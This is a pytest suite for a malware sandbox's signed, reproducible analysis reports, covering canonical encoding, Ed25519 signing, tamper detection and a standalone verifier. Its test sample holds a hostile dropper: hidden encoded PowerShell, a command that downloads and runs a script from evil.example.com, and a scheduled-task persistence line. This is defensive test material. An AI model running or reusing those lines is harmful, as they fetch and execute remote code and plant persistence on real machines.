"""The signed, reproducible report — the part of the product a regulator uses.

Detonation is free and commoditised; a verdict a third party can check without
trusting us is not. Everything asserted here is load-bearing for that claim:

1. The canonical encoding is a *function* — same analysis, same bytes, on any
   host. Without that, a signature covers nothing repeatable.
2. Two submissions of the same sample produce a byte-identical reproducible
   section. This is the test that catches a volatile field (a timing, a uuid, a
   clock read) leaking into the evidence.
3. A signature verifies, and stops verifying the instant one byte moves.
4. With no key configured the export says UNSIGNED in words a recipient will
   read, rather than shipping a document that merely lacks a signature field.
5. ``tools/verify_report.py`` — the copy a regulator runs with no access to this
   system — encodes byte-for-byte identically to the engine. The duplication is
   deliberate; the drift is what would be fatal.
"""
from __future__ import annotations

import base64
import copy
import importlib.util
import json
import subprocess
import sys
from datetime import datetime, timezone
from pathlib import Path

import pytest

from app.config import Settings, get_settings
from app.engine import attestation, pipeline, scoring
from app.engine.models import JobStatus, SandboxJob
from app.engine.storage import store_bytes
from app.main import app

REPO = Path(__file__).resolve().parents[2]
VERIFIER = REPO / "tools" / "verify_report.py"

#: A fixed seed, so the public key in these assertions is stable. Test-only: it
#: is published in this file, which is exactly what a signing key must never be.
SEED = base64.b64encode(bytes(range(32))).decode("ascii")

_SAMPLE = (
    b"powershell -w hidden -EncodedCommand aQBlAHgA\n"
    b"IEX ((New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1'))\n"
    b"schtasks /create /tn Updater /tr C:\\Temp\\p.exe /sc onlogon\n"
)


def _run(db, payload: bytes, name: str) -> SandboxJob:
    job = pipeline.new_job(db, store_bytes(payload), original_name=name, tenant="default")
    db.commit()
    pipeline.run(db, job)
    db.commit()
    assert job.status == JobStatus.COMPLETED
    return job


@pytest.fixture()
def signing_settings():
    """Settings with a signing key, injected into the app for one test."""
    settings = Settings(signing_key=SEED)
    app.dependency_overrides[get_settings] = lambda: settings
    try:
        yield settings
    finally:
        app.dependency_overrides.pop(get_settings, None)


# ============================================================================
# canonical serialisation
# ============================================================================


def test_canonical_bytes_are_independent_of_key_insertion_order():
    a = {"b": 1, "a": {"z": [1, 2], "y": "x"}}
    b = {"a": {"y": "x", "z": [1, 2]}, "b": 1}
    assert attestation.canonical_bytes(a) == attestation.canonical_bytes(b)
    assert attestation.canonical_bytes(a) == b'{"a":{"y":"x","z":[1,2]},"b":1}'


def test_canonical_bytes_have_no_insignificant_whitespace():
    assert b" " not in attestation.canonical_bytes({"a": 1, "b": [1, 2]})


def test_canonical_bytes_escape_non_ascii_so_the_encoding_cannot_drift():
    # A filename in Azerbaijani must not encode differently on a host with a
    # different default encoding.
    encoded = attestation.canonical_bytes({"filename": "şəfər.exe"})
    assert encoded == b'{"filename":"\\u015f\\u0259f\\u0259r.exe"}'
    assert encoded.decode("ascii")


def test_negative_zero_and_positive_zero_encode_identically():
    # -0.0 reprs as "-0.0"; two arithmetically identical runs would otherwise
    # produce different bytes and a signature that fails for no reason.
    assert attestation.canonical_bytes({"x": -0.0}) == attestation.canonical_bytes({"x": 0.0})


def test_float_noise_below_the_stated_precision_does_not_change_the_bytes():
    assert attestation.canonical_bytes({"x": 0.1 + 0.2}) == attestation.canonical_bytes({"x": 0.3})


def test_non_finite_floats_become_null_rather_than_invalid_json():
    encoded = attestation.canonical_bytes({"a": float("nan"), "b": float("inf")})
    assert encoded == b'{"a":null,"b":null}'
    assert json.loads(encoded) == {"a": None, "b": None}


def test_timestamps_are_normalised_to_utc_at_second_precision():
    naive = datetime(2026, 7, 27, 10, 30, 15, 123456)
    aware = datetime(2026, 7, 27, 10, 30, 15, 999999, tzinfo=timezone.utc)
    assert attestation.canonical_bytes(naive) == b'"2026-07-27T10:30:15Z"'
    # Sub-second precision is dropped on purpose: SQLite and PostgreSQL disagree
    # about it, and the bytes must not depend on the database engine.
    assert attestation.canonical_bytes(naive) == attestation.canonical_bytes(aware)


def test_json_round_trip_does_not_change_the_canonical_bytes():
    """The export is served as ordinary JSON; a verifier re-canonicalises what it
    parsed. If a round trip changed the bytes, every served report would fail."""
    document = {
        "f": 8.8,
        "i": 42,
        "s": "şəfər",
        "b": True,
        "n": None,
        "l": [0.1, -0.0, 1e-7],
    }
    once = attestation.canonical_bytes(document)
    assert attestation.canonical_bytes(json.loads(once.decode("ascii"))) == once


def test_digest_is_the_sha256_of_the_canonical_bytes():
    import hashlib

    document = {"a": 1}
    expected = "sha256:" + hashlib.sha256(attestation.canonical_bytes(document)).hexdigest()
    assert attestation.digest(document) == expected


# ============================================================================
# the engine manifest
# ============================================================================


def test_manifest_pins_everything_that_can_change_a_verdict():
    manifest = attestation.engine_manifest()
    assert manifest["product"] == "Cyclowareness Sandbox"
    assert manifest["app_version"]
    assert manifest["impact_rating"]["notation"] == "CIR:1.0"

    names = {a["name"] for a in manifest["analyzers"]}
    assert {"generic", "script", "pe"} <= names
    for analyzer in manifest["analyzers"]:
        assert analyzer["version"] and analyzer["version"] != "unknown"

    assert manifest["yara_ruleset"]["file_count"] >= 1
    assert len(manifest["yara_ruleset"]["sha256"]) == 64

    assert manifest["scoring"]["feature_weights"] == dict(scoring.WEIGHTS)
    assert manifest["scoring"]["blend"] == scoring.get_weights()
    assert manifest["libraries"]["yara-python"]
    assert isinstance(manifest["unavailable_analyzers"], dict)
    assert manifest["digest"].startswith("sha256:")


def test_manifest_records_the_blend_actually_in_effect_not_the_default():
    # The rule/model split is tunable from the admin UI at runtime. A report that
    # recorded the default would misdescribe its own verdict.
    scoring.set_weights(9.0, 1.0)
    assert attestation.engine_manifest()["scoring"]["blend"] == {"rule": 0.9, "model": 0.1}


def test_ruleset_digest_changes_when_a_rule_file_changes(tmp_path, monkeypatch):
    monkeypatch.setattr(attestation, "RULES_DIR", tmp_path)
    (tmp_path / "a.yar").write_bytes(b"rule A { condition: false }")
    before = attestation.ruleset_digest()

    (tmp_path / "a.yar").write_bytes(b"rule A { condition: true }")
    after_edit = attestation.ruleset_digest()
    assert after_edit["sha256"] != before["sha256"]

    # A rename with identical content is also a different ruleset.
    (tmp_path / "a.yar").rename(tmp_path / "b.yar")
    assert attestation.ruleset_digest()["sha256"] != after_edit["sha256"]


# ============================================================================
# reproducibility
# ============================================================================


def test_two_submissions_of_one_sample_produce_identical_reproducible_bytes(db):
    """The claim the whole product rests on, asserted rather than asserted-at."""
    first = attestation.build_report(_run(db, _SAMPLE, "dropper.ps1"))
    second = attestation.build_report(_run(db, _SAMPLE, "dropper.ps1"))

    left = attestation.canonical_bytes(first["reproducible"])
    right = attestation.canonical_bytes(second["reproducible"])
    assert left == right, "the reproducible section is not reproducible"
    assert first["reproducible_digest"] == second["reproducible_digest"]

    # And the submissions are genuinely distinct jobs, so this is not a tautology.
    assert first["submission"]["job_id"] != second["submission"]["job_id"]


def test_the_submission_half_carries_the_per_submission_facts(db):
    report = attestation.build_report(_run(db, _SAMPLE, "dropper.ps1"))
    assert report["submission"]["job_id"]
    assert report["submission"]["status"] == JobStatus.COMPLETED
    assert report["submission"]["generated_at"].endswith("Z")
    # None of them may sit in the half we call reproducible.
    for key in ("job_id", "generated_at", "status"):
        assert key not in report["reproducible"]


def test_the_reproducible_half_still_carries_the_whole_verdict(db):
    body = attestation.build_report(_run(db, _SAMPLE, "dropper.ps1"))["reproducible"]
    for key in ("sha256", "final_score", "risk_level", "verdict", "impact", "mitre",
                "signals", "analyzers", "iocs", "tiers", "score_breakdown"):
        assert key in body, f"{key} is missing from the signed evidence"
    assert body["signals"], "a sample with signals must carry them into the evidence"


def test_analyzer_timings_are_stripped_because_they_are_not_findings(db):
    job = _run(db, _SAMPLE, "dropper.ps1")
    assert any("duration_ms" in p for p in job.analysis.values())
    body = attestation.build_report(job)["reproducible"]
    assert not any("duration_ms" in p for p in body["analyzers"].values())


# ============================================================================
# signing and verification
# ============================================================================


def test_sign_and_verify_a_real_report_end_to_end(db):
    settings = Settings(signing_key=SEED)
    envelope = attestation.attest(_run(db, _SAMPLE, "dropper.ps1"), settings=settings)

    assert envelope["signed"] is True
    assert envelope["algorithm"] == "Ed25519"
    assert envelope["unsigned_reason"] is None
    assert envelope["public_key"]

    payload = attestation.signed_payload(envelope)
    assert attestation.verify(payload, envelope["signature"], envelope["public_key"]) is True


def test_one_flipped_byte_fails_verification(db):
    settings = Settings(signing_key=SEED)
    envelope = attestation.attest(_run(db, _SAMPLE, "dropper.ps1"), settings=settings)
    good = attestation.signed_payload(envelope)

    # A single byte of the signed payload.
    tampered = bytearray(good)
    index = tampered.index(b"malicious"[0])
    tampered[index] ^= 0x01
    assert bytes(tampered) != good
    assert attestation.verify(bytes(tampered), envelope["signature"], envelope["public_key"]) is False

    # A single byte of the signature.
    raw = bytearray(base64.b64decode(envelope["signature"]))
    raw[0] ^= 0x01
    flipped = base64.b64encode(bytes(raw)).decode("ascii")
    assert attestation.verify(good, flipped, envelope["public_key"]) is False


def test_editing_the_verdict_inside_the_document_fails_verification(db):
    """The attack the signature actually exists to stop: someone downgrades the
    verdict in the file before forwarding it."""
    settings = Settings(signing_key=SEED)
    envelope = attestation.attest(_run(db, _SAMPLE, "dropper.ps1"), settings=settings)
    assert attestation.verify(
        attestation.signed_payload(envelope), envelope["signature"], envelope["public_key"]
    )

    edited = copy.deepcopy(envelope)
    edited["report"]["reproducible"]["risk_level"] = "low"
    assert attestation.verify(
        attestation.signed_payload(edited), edited["signature"], edited["public_key"]
    ) is False


def test_a_different_key_does_not_verify(db):
    envelope = attestation.attest(
        _run(db, _SAMPLE, "dropper.ps1"), settings=Settings(signing_key=SEED)
    )
    other = base64.b64encode(bytes(range(32, 64))).decode("ascii")
    other_public = attestation.public_key_b64(attestation.load_private_key(other))
    assert attestation.verify(
        attestation.signed_payload(envelope), envelope["signature"], other_public
    ) is False


def test_verify_returns_false_for_malformed_input_rather_than_raising():
    assert attestation.verify(b"x", "not base64!!", "also not base64!!") is False
    assert attestation.verify(b"x", "", "") is False


def test_a_truncated_seed_is_refused_rather_than_padded():
    short = base64.b64encode(b"\x00" * 16).decode("ascii")
    with pytest.raises(attestation.SigningUnavailable) as exc:
        attestation.load_private_key(short)
    assert "32" in str(exc.value)


# ============================================================================
# the unsigned path
# ============================================================================


def test_without_a_key_the_report_says_unsigned_in_words(db):
    envelope = attestation.attest(_run(db, _SAMPLE, "dropper.ps1"), settings=Settings(signing_key=""))

    assert envelope["signed"] is False
    assert envelope["signature"] is None
    assert envelope["public_key"] is None
    assert "UNSIGNED" in envelope["unsigned_reason"]
    assert "SIGNING_KEY" in envelope["unsigned_reason"]
    # The report itself is still produced in full — the verdict is the point.
    assert envelope["report"]["reproducible"]["sha256"]
    assert envelope["manifest"]["app_version"]


def test_the_demo_build_does_not_invent_an_ephemeral_key(db, client, auth):
    """A per-boot key would sign reports that verify today and against nothing
    tomorrow. The default posture must be honestly unsigned."""
    job = _run(db, _SAMPLE, "dropper.ps1")
    response = client.get(f"/api/jobs/{job.public_id}/export.signed", headers=auth)
    assert response.status_code == 200, response.text
    assert response.json()["signed"] is False


# ============================================================================
# the HTTP surface
# ============================================================================


def test_export_signed_route_returns_a_verifiable_document(db, client, auth, signing_settings):
    job = _run(db, _SAMPLE, "dropper.ps1")
    response = client.get(f"/api/jobs/{job.public_id}/export.signed", headers=auth)
    assert response.status_code == 200, response.text

    envelope = response.json()
    assert envelope["schema"] == attestation.SCHEMA
    assert envelope["signed"] is True
    # Verification happens on the *parsed* response, exactly as a recipient does it.
    assert attestation.verify(
        attestation.signed_payload(envelope), envelope["signature"], envelope["public_key"]
    )


def test_export_signed_requires_authentication(db, client):
    job = _run(db, _SAMPLE, "dropper.ps1")
    assert client.get(f"/api/jobs/{job.public_id}/export.signed").status_code == 401


def test_export_signed_404s_for_an_unknown_job(client, auth):
    assert client.get("/api/jobs/nope/export.signed", headers=auth).status_code == 404


def test_pubkey_is_public_because_a_recipient_has_no_credentials(client, signing_settings):
    response = client.get("/api/attestation/pubkey")
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["signing_enabled"] is True
    assert body["algorithm"] == "Ed25519"
    assert body["public_key"] == attestation.public_key_b64(attestation.load_private_key(SEED))
    assert body["key_id"] == attestation.key_id(body["public_key"])


def test_pubkey_states_the_gap_when_no_key_is_configured(client):
    body = client.get("/api/attestation/pubkey").json()
    assert body["signing_enabled"] is False
    assert body["public_key"] is None
    assert "UNSIGNED" in body["detail"]


# ============================================================================
# the standalone verifier a regulator runs
# ============================================================================


def _verifier_module():
    spec = importlib.util.spec_from_file_location("verify_report_tool", VERIFIER)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(module)
    return module


def test_the_standalone_verifier_encodes_identically_to_the_engine(db):
    """The one thing that could silently break offline verification: the copy in
    tools/ drifting from the engine's encoder."""
    tool = _verifier_module()
    envelope = attestation.attest(
        _run(db, _SAMPLE, "dropper.ps1"), settings=Settings(signing_key=SEED)
    )
    served = json.loads(json.dumps(envelope))

    assert tool.CANONICALIZATION == attestation.CANONICALIZATION
    assert tool.signed_payload(served) == attestation.signed_payload(envelope)
    assert tool.verify(tool.signed_payload(served), served["signature"], served["public_key"])
    assert tool.key_id(served["public_key"]) == attestation.key_id(served["public_key"])


def _run_verifier(path: Path, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, str(VERIFIER), str(path), *args],
        capture_output=True,
        text=True,
    )


def test_the_standalone_verifier_passes_a_genuine_report_and_fails_a_tampered_one(db, tmp_path):
    envelope = attestation.attest(
        _run(db, _SAMPLE, "dropper.ps1"), settings=Settings(signing_key=SEED)
    )
    good = tmp_path / "report.signed.json"
    good.write_text(json.dumps(envelope), encoding="utf-8")

    result = _run_verifier(good)
    assert result.returncode == 0, result.stdout + result.stderr
    assert "RESULT: VERIFIED." in result.stdout
    # Printed on whatever console a recipient has. A cp1252 terminal turns an em
    # dash into a replacement character, and mojibake in a verification result is
    # the wrong impression to give an auditor.
    assert result.stdout.isascii(), "the verifier printed non-ASCII output"
    # It must not let a reader think the verdict itself was attested.
    assert "does not attest that the verdict is correct" in result.stdout

    # Supplying the key out of band is the trustworthy mode, and it must pass too.
    keyed = _run_verifier(good, "--public-key", envelope["public_key"])
    assert keyed.returncode == 0
    assert "CAUTION" not in keyed.stdout

    tampered = copy.deepcopy(envelope)
    tampered["report"]["reproducible"]["final_score"] = 0.0
    bad = tmp_path / "tampered.signed.json"
    bad.write_text(json.dumps(tampered), encoding="utf-8")

    result = _run_verifier(bad)
    assert result.returncode == 1
    assert "NOT VERIFIED" in result.stdout
    assert "has been altered" in result.stdout


def test_the_standalone_verifier_refuses_an_unsigned_report(db, tmp_path):
    envelope = attestation.attest(_run(db, _SAMPLE, "dropper.ps1"), settings=Settings(signing_key=""))
    path = tmp_path / "unsigned.json"
    path.write_text(json.dumps(envelope), encoding="utf-8")

    result = _run_verifier(path)
    assert result.returncode == 1
    assert "UNSIGNED" in result.stdout


def test_the_standalone_verifier_rejects_a_file_that_is_not_one_of_ours(tmp_path):
    path = tmp_path / "random.json"
    path.write_text(json.dumps({"hello": "world"}), encoding="utf-8")
    result = _run_verifier(path)
    assert result.returncode == 2
    assert "not a Cyclowareness Sandbox signed export" in result.stdout
